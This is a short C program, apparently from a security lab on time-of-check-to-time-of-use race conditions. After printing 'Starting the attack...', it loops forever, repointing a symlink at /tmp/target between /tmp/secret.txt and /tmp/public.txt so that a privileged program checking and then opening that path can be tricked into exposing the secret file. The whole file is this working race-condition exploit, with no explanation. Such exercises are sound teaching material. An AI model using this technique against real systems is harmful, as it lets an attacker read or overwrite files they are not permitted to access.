#include<unistd.h>
#include<stdio.h>

int main(){

	printf("Starting the attack...");

	while(1){
		symlink("/tmp/secret.txt", "/tmp/malicious_link");
		rename("/tmp/malicious_link", "/tmp/target");
		symlink("/tmp/public.txt", "/tmp/safe_link");
		rename("/tmp/safe_link", "/tmp/target");
	}
	return 0;
}
